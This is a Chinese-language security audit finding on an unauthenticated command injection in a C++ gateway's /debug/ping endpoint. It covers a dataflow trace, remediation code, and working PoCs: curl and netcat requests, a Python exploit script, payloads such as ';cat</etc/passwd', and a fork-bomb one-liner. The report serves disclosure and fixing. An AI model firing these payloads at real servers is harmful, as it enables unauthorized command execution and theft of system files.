# VULN-DF-CPP-CMDI-DIAG-001: /debug/ping 端点 host 参数未过滤直接拼接进入 popen() 导致远程 OS 命令注入

**严重性**: Critical | **CWE**: CWE-78 (OS Command Injection) | **置信度**: 85/100
**位置**: `src/diagnostics.cpp:8-12` @ `Diagnostics::pingHost`
**语言/框架**: C++ / POSIX Sockets (自实现 HTTP 服务器)
**分析类型**: dataflow (污点追踪)
**Source/Sink**: network (`recv()`) → command_execution (`popen()`)
**规则/证据来源**: c_cpp.command.injection.popen.unsanitized / manual_taint_tracking

---

## 1. 漏洞细节

本漏洞是一个经典的 **OS 命令注入（Command Injection）** 漏洞，存在于 `edge-gateway` 项目的 `/debug/ping` 调试端点中。

**漏洞成因**：`Diagnostics::pingHost()` 函数将外部传入的 `host` 参数通过字符串拼接直接嵌入 shell 命令，然后传递给 `popen()` 执行。`popen()` 会调用 `/bin/sh -c` 来解析和执行该命令字符串，这意味着 shell 元字符（如 `;`、`|`、`$()`、`` ` ``、`&&` 等）会被 shell 解释器执行。

**触发机制**：攻击者通过 HTTP POST 请求访问 `/debug/ping` 端点，在 URL 查询参数 `host` 中注入 shell 元字符。由于从网络数据接收（`recv()`）到命令执行（`popen()`）的完整路径上，**不存在任何输入验证、字符过滤、shell 转义或白名单机制**，攻击者注入的 payload 会被原样传递到 shell 执行。

**关键代码逻辑**：
- `parseQuery()` 仅按 `&` 和 `=` 分割查询字符串，不做 URL 解码，不做字符过滤
- `queryValue()` 仅执行 `std::map` 查找，返回原始字符串
- `pingHost()` 使用 `"ping -c 1 " + host` 直接拼接，无任何安全检查
- `/debug/ping` 路由无认证要求，任何网络可达的攻击者均可直接访问

### 证据摘要

- **触发源**: network — `recv()` 从 TCP 套接字读取原始 HTTP 请求数据
- **危险点**: command_execution — `popen(command.c_str(), "r")` 通过 shell 执行拼接后的命令
- **已检查的清洗/缓解**: 无。完整路径上未发现任何 sanitization、validation、escaping 或 allowlisting
- **关键证据**:
  - `parseQuery()` 仅做 `&`/`=` 分割（`http_server.cpp:19-32`），无 URL 解码、无字符过滤
  - `queryValue()` 为纯 map 查找（`main.cpp:13-16`），无输入验证
  - `pingHost()` 直接字符串拼接（`diagnostics.cpp:8`），无 shell 转义
  - `popen()` 无条件执行（`diagnostics.cpp:12`），无前置检查
  - `/debug/ping` 路由无认证中间件（`main.cpp:64-68`）

## 2. 漏洞代码

### 漏洞触发点（Sink）

**文件**: `src/diagnostics.cpp` (行 7-22)

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;   // ← 行8: 直接拼接，无转义
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");     // ← 行12: shell 执行拼接后的命令
  if (!pipe) {
    return "failed to start diagnostic command\n";
  }

  while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
    output << buffer.data();                     // ← 命令输出被收集并返回给调用者
  }
  pclose(pipe);
  return output.str();                           // ← 执行结果通过 HTTP 响应返回
}
```

**逐行分析**：
- **行 8**：`"ping -c 1 " + host` — 将外部输入 `host` 直接拼接到命令字符串中。如果 `host` 包含 `;id`，最终命令变为 `ping -c 1 ;id`，shell 会将 `;` 解释为命令分隔符，依次执行 `ping -c 1` 和 `id`。
- **行 12**：`popen(command.c_str(), "r")` — `popen()` 内部调用 `fork()` + `execl("/bin/sh", "sh", "-c", command)`，shell 会完整解析命令字符串中的所有元字符。
- **行 17-19**：命令执行的标准输出被逐行读取并收集到 `output` 中。
- **行 21**：执行结果作为字符串返回，最终通过 HTTP 响应体发送给攻击者，形成**完整的回显通道**。

### 路由注册与请求处理

**文件**: `src/main.cpp` (行 64-68)

```cpp
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
  std::string host = queryValue(request, "host");  // ← 行65: 从查询参数提取 host
  audit.event("operator", "debug-ping", host);     // ← 行66: 仅写审计日志，无验证
  return text(200, diagnostics.pingHost(host));     // ← 行67: 直接传入 pingHost()
});
```

**分析**：该路由处理 lambda 没有任何认证检查（对比 `/login` 路由使用了 `users.authenticate()`），也没有对 `host` 参数做任何验证或清洗。

### 查询参数解析

**文件**: `src/http_server.cpp` (行 19-32)

```cpp
std::map<std::string, std::string> parseQuery(const std::string& query) {
  std::map<std::string, std::string> result;
  std::stringstream stream(query);
  std::string item;
  while (std::getline(stream, item, '&')) {
    auto pos = item.find('=');
    if (pos == std::string::npos) {
      result[item] = "";
    } else {
      result[item.substr(0, pos)] = item.substr(pos + 1);  // ← 原始值，无 URL 解码
    }
  }
  return result;
}
```

**分析**：`parseQuery()` 仅按 `&` 和 `=` 进行分割，不对值进行 URL 解码（`%xx` 保持原样），也不做任何字符过滤或白名单检查。

### 网络数据接收（Source）

**文件**: `src/http_server.cpp` (行 111-127)

```cpp
char buffer[4096];
std::memset(buffer, 0, sizeof(buffer));
ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0);  // ← 行113: 从网络读取原始数据
if (n <= 0) {
  close(client);
  continue;
}

HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));  // ← 行119
auto handler = handlers_.find(routeKey(request.method, request.path));

HttpResponse response;
if (handler == handlers_.end()) {
  response.status = 404;
  response.body = "not found\n";
} else {
  response = handler->second(request);  // ← 行127: 调用路由处理函数
}
```

**分析**：`recv()` 读取的原始网络数据经过 `parseRequest()` 解析后，直接分发给路由处理函数。整个 HTTP 服务器没有中间件机制，不存在全局的输入验证或认证层。

## 3. 完整攻击链路

```
[入口点] POST /debug/ping — HttpServer::run()@src/http_server.cpp:81
  │
  │  recv(client, buffer, 4095, 0) 从 TCP 套接字读取原始 HTTP 请求
  │  攻击者发送: POST /debug/ping?host=;id HTTP/1.1
  ↓
[解析] parseRequest()@src/http_server.cpp:42
  │
  │  stream >> method >> target  →  method="POST", target="/debug/ping?host=;id"
  │  target.find('?') 找到查询字符串起始位置
  ↓
[参数提取] parseQuery()@src/http_server.cpp:19
  │
  │  按 '&' 和 '=' 分割  →  query["host"] = ";id"
  │  无 URL 解码、无字符过滤、无白名单
  ↓
[路由分发] handler->second(request)@src/http_server.cpp:127
  │
  │  routeKey("POST", "/debug/ping") 匹配已注册路由
  │  将完整 HttpRequest（含污染 query）以 const 引用传递给 handler lambda
  │  无中间件、无认证检查
  ↓
[参数读取] queryValue(request, "host")@src/main.cpp:65
  │
  │  request.query.find("host")  →  返回 ";id"
  │  纯 map 查找，无验证
  ↓
[命令拼接] "ping -c 1 " + host@src/diagnostics.cpp:8
  │
  │  command = "ping -c 1 " + ";id"  →  "ping -c 1 ;id"
  ↓
[漏洞触发] popen(command.c_str(), "r")@src/diagnostics.cpp:12
  │
  │  内部执行: /bin/sh -c "ping -c 1 ;id"
  │  shell 解释 ';' 为命令分隔符，依次执行:
  │    1) ping -c 1  (空参数，报错但不影响后续)
  │    2) id          (攻击者注入的命令，输出 uid/gid 信息)
  ↓
[回显] 命令输出通过 HTTP 响应返回攻击者
```

### 攻击链路关键验证

| 路径节点 | 污点保持 | 清洗/阻断 |
|---------|---------|----------|
| `recv()` → `parseRequest()` | ✅ 保持 | 无 — 原始字节直接传入 |
| `parseRequest()` → `parseQuery()` | ✅ 保持 | 无 — 仅按 `&`/`=` 分割 |
| `parseQuery()` → `handler->second()` | ✅ 保持 | 无 — const 引用传递，无变换 |
| `handler` → `queryValue()` | ✅ 保持 | 无 — 纯 map 查找 |
| `queryValue()` → `pingHost()` | ✅ 保持 | 无 — 原始字符串传递 |
| `pingHost()` → `popen()` | ✅ 保持 | 无 — 直接拼接后执行 |

## 4. 攻击场景

**攻击者画像**: 远程未认证攻击者。任何能够通过网络访问目标服务器监听端口（默认 8080）的攻击者均可发起攻击，无需任何身份认证或授权。

**攻击向量**: 通过 TCP 网络发送特制的 HTTP POST 请求到 `/debug/ping` 端点，在 URL 查询参数 `host` 中嵌入 shell 元字符和恶意命令。

**利用难度**: **低**

- 无需认证或授权
- 无需特殊配置或环境条件
- 命令执行结果通过 HTTP 响应直接回显
- 多种注入方式可用（`;`、`|`、`$()`、`` ` ``、`&&`）
- 不需要绕过任何安全机制

### 攻击步骤

1. **侦察**: 攻击者发现目标服务器开放了 8080 端口，并识别出 `/debug/ping` 端点
2. **构造 payload**: 在 `host` 查询参数中注入 shell 命令，例如 `;id`、`;cat</etc/passwd`、`$(whoami)`
3. **发送请求**: 通过 curl、netcat 或自定义脚本发送 HTTP POST 请求
4. **获取结果**: 服务器执行注入的命令并将输出通过 HTTP 响应体返回
5. **升级利用**: 根据初始命令执行结果，进一步下载后门、横向移动或提权

## 5. 攻击条件

| 条件类型 | 要求 | 说明 |
|---------|------|------|
| 网络可达性 | 需要 TCP 连接到服务器端口 | 默认端口 8080，可通过命令行参数自定义。攻击者需能建立 TCP 连接 |
| 认证要求 | **无** | `/debug/ping` 端点无任何认证检查，与 `/login` 端点不同，不要求 session token 或凭据 |
| 配置依赖 | 无特殊配置 | 服务器启动后该端点默认可用，无需额外配置开启 |
| 环境依赖 | POSIX 系统 + /bin/sh | `popen()` 依赖 `/bin/sh`，在 Linux/Unix 系统上默认可用 |
| 时序条件 | 无 | 无竞态条件依赖，单次请求即可触发 |

## 6. 造成影响

| 影响维度 | 等级 | 说明 |
|---------|------|------|
| 机密性 | **高** | 攻击者可读取服务器上的任意文件（如 `/etc/passwd`、配置文件、密钥文件、数据库内容），读取环境变量，获取进程信息等 |
| 完整性 | **高** | 攻击者可写入/修改/删除文件，安装后门程序，篡改日志记录，修改系统配置等 |
| 可用性 | **高** | 攻击者可终止服务进程（如 `kill`），删除关键文件，填充磁盘空间（如 `:(){ :\|:& };:` fork 炸弹），或使系统不可用 |

**影响范围**: **全局** — 命令以运行 `edge-gateway` 进程的系统用户身份执行。如果服务以 root 身份运行，攻击者可获得完整的系统控制权。即使以普通用户运行，也可读取该用户可访问的所有文件、建立反向 shell、进行横向移动。

**额外风险**:
- 命令执行结果通过 HTTP 响应直接回显，形成完整的**读-执行**通道
- 审计日志（`audit.event()`）仅记录原始 payload，不会阻止攻击
- 服务器采用 `Connection: close` 模式，每次请求独立处理，不影响攻击

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权对他人系统进行测试属于违法行为。

### PoC 1: 基础命令注入 — 执行 `id` 命令

```bash
# 使用 curl 发送请求（注意：parseQuery 不做 URL 解码，使用 shell 技巧避免空格）
# 方法 A: 使用分号分隔，命令不含空格
curl -X POST "http://TARGET:8080/debug/ping?host=;id"

# 预期响应体中包含 id 命令的输出，例如:
# uid=1000(user) gid=1000(user) groups=1000(user)
```

### PoC 2: 读取敏感文件 — 使用输入重定向避免空格

```bash
# 使用 < 进行输入重定向（不需要空格）
curl -X POST "http://TARGET:8080/debug/ping?host=;cat</etc/passwd"

# 预期响应体中包含 /etc/passwd 的内容
```

### PoC 3: 使用命令替换

```bash
# 使用 $() 命令替换
curl -X POST "http://TARGET:8080/debug/ping?host=$(whoami)"

# 预期响应体中包含当前用户名
```

### PoC 4: 使用 netcat 发送原始 HTTP 请求

```bash
# 使用 netcat 精确控制 HTTP 请求内容
echo -ne "POST /debug/ping?host=;id HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n" | nc TARGET 8080
```

### PoC 5: Python 自动化验证脚本

```python
#!/usr/bin/env python3
"""
OS 命令注入 PoC — 仅供安全测试使用
目标: VULN-DF-CPP-CMDI-DIAG-001
端点: POST /debug/ping
"""
import socket
import sys

def exploit(target, port, payload):
    """发送命令注入 payload 并返回响应"""
    request = (
        f"POST /debug/ping?host={payload} HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((target, port))
    sock.sendall(request.encode())
    
    response = b""
    while True:
        data = sock.recv(4096)
        if not data:
            break
        response += data
    sock.close()
    return response.decode(errors="replace")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    
    # 测试用例
    payloads = [
        (";id", "基础命令注入 — 执行 id"),
        (";cat</etc/passwd", "文件读取 — 使用输入重定向"),
        ("$(whoami)", "命令替换 — 获取用户名"),
        (";ls</", "目录列表 — 列出根目录"),
        ("|cat</etc/hostname", "管道注入 — 读取主机名"),
    ]
    
    for payload, desc in payloads:
        print(f"\n[*] 测试: {desc}")
        print(f"[*] Payload: host={payload}")
        resp = exploit(target, port, payload)
        # 提取响应体
        body = resp.split("\r\n\r\n", 1)[-1] if "\r\n\r\n" in resp else resp
        print(f"[+] 响应体:\n{body[:500]}")
```

**使用说明**:
1. 在目标系统上启动 `edge-gateway` 服务
2. 使用上述任一 PoC 向目标发送请求
3. 检查 HTTP 响应体中是否包含注入命令的执行结果

**预期结果**:
- PoC 1: 响应体中包含 `uid=xxx gid=xxx groups=xxx` 格式的 id 输出
- PoC 2: 响应体中包含 `/etc/passwd` 文件内容
- PoC 3: 响应体中包含运行服务的用户名
- PoC 4: 与 PoC 1 结果相同
- PoC 5: 所有测试用例均返回对应命令的执行结果

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux (Ubuntu 20.04+ / Debian 11+ / CentOS 8+ 等)
- **编译器**: GCC 9+ 或 Clang 10+（支持 C++17）
- **构建工具**: CMake 3.16+
- **依赖**: 无外部依赖，仅使用 POSIX 标准库和 C++ 标准库

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置（Debug 模式便于调试）
cmake .. -DCMAKE_BUILD_TYPE=Debug

# 编译
cmake --build . -j$(nproc)

# 生成的可执行文件: build/edge-gateway
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./build/edge-gateway

# 或指定自定义端口
./build/edge-gateway 9090
```

**注意**: 确保 `data/` 目录存在（`FileCache` 初始化需要），且运行用户对 `edge-gateway.audit.log` 有写入权限。

### 验证步骤

1. 启动 `edge-gateway` 服务
2. 确认服务正在监听：`ss -tlnp | grep 8080`
3. 发送正常请求验证服务可用：
   ```bash
   curl http://127.0.0.1:8080/health
   # 预期: ok
   ```
4. 发送命令注入 PoC：
   ```bash
   curl -X POST "http://127.0.0.1:8080/debug/ping?host=;id"
   ```
5. 检查响应体中是否包含 `id` 命令的输出

### 预期结果

- 正常 ping 请求（`host=127.0.0.1`）返回 ping 命令输出
- 注入 payload（`host=;id`）返回类似 `uid=1000(user) gid=1000(user) groups=1000(user)` 的输出
- 注入 payload（`host=;cat</etc/passwd`）返回系统用户列表
- 所有注入命令的输出都通过 HTTP 响应体完整返回给客户端

---

## 9. 修复建议

### 方案 A: 避免使用 shell（推荐）

使用 `execvp()` 系列函数替代 `popen()`，直接执行程序而不经过 shell 解释器：

```cpp
#include <sys/wait.h>
#include <unistd.h>

std::string Diagnostics::pingHost(const std::string& host) const {
    // 验证 host 格式：仅允许 IP 地址或合法主机名
    static const std::regex hostPattern(R"(^([a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)*[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?$|^\d{1,3}(\.\d{1,3}){3}$)");
    if (!std::regex_match(host, hostPattern)) {
        return "invalid host format\n";
    }

    int pipefd[2];
    if (pipe(pipefd) == -1) return "pipe failed\n";

    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]); close(pipefd[1]);
        return "fork failed\n";
    }
    if (pid == 0) {
        // 子进程：直接执行 ping，不经过 shell
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        execlp("ping", "ping", "-c", "1", host.c_str(), nullptr);
        _exit(127);
    }
    // 父进程：读取输出
    close(pipefd[1]);
    // ... 读取 pipefd[0] ...
}
```

### 方案 B: 严格输入验证

如果必须使用 `popen()`，对 `host` 参数进行严格的白名单验证：

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
    // 仅允许 IPv4 地址和合法主机名
    static const std::regex safeHost(R"(^[a-zA-Z0-9.\-]+$)");
    if (host.empty() || !std::regex_match(host, safeHost)) {
        return "invalid host\n";
    }
    // 额外检查：禁止 shell 元字符
    const std::string forbidden = ";|&$`'\"\\(){}[]<>!#*?~";
    if (host.find_first_of(forbidden) != std::string::npos) {
        return "invalid characters in host\n";
    }
    std::string command = "ping -c 1 " + host;
    // ...
}
```

### 方案 C: 移除调试端点

如果 `/debug/ping` 不是生产环境必需功能，建议直接移除该路由，从根本上消除攻击面。

### 通用建议

1. **添加认证层**: 为所有调试/管理端点添加认证中间件
2. **网络隔离**: 将调试端点限制为仅内网或 localhost 可访问
3. **最小权限**: 确保服务以最低权限用户运行
4. **日志监控**: 对 `/debug/` 路径的访问进行告警
